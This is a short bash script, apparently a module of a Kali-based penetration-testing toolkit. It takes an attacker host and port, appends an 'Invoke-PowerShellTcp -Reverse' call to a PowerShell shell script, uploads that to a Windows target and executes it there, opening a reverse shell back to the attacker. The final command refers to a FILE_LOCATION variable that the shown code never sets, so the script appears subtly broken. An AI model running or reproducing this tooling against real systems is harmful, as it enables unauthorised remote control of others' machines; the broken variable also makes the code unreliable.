#!/bin/bash

: '
ps: download Invoke-PowerShellTc.ps1 to server and start shell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${PORT_FIELD}"

LHOST=${form_data["lhost"]}
PORT=${form_data["port"]}

LOCATION="${SCRIPTS_DIR}/shell/windows/.files"
SRC_FILE="${FILES_FOLDER}/Invoke-PowerShellTc.ps1"
TMP_FILE="${FILES_FOLDER}/Invoke-PowerShellTc-shell.ps1"

cp "${SRC_FILE}" "${TMP_FILE}"
echo "Invoke-PowerShellTcp -Reverse -IPAddress ${LHOST} -Port ${PORT}" >> "${TMP_FILE}"

ps_webclient_upload_file "${LOCATION}" "${TMP_FILE}"

execute_command "powershell -c '${FILE_LOCATION}'"
create_new_line
